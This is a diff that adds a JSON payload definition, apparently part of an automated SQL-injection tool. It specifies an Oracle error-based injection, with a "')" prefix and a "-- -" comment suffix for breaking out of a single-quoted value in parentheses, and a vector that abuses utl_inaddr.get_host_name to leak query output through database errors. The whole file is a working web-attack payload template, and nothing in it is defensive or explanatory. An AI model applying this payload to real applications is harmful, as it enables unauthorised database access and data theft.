@@ -1,0 +1,12 @@
+{
+ "dbms": "oracle",
+ "technique": "error",
+ "boundary": {
+  "prefix": "')",
+  "suffix": "-- -",
+  "type": "paren-single",
+  "desc": "single-quoted inside parenthesis"
+ },
+ "vector": "{B} OR 1=utl_inaddr.get_host_name(({Q}))",
+ "comment": "oracle error via single-quoted inside parenthesis"
+}
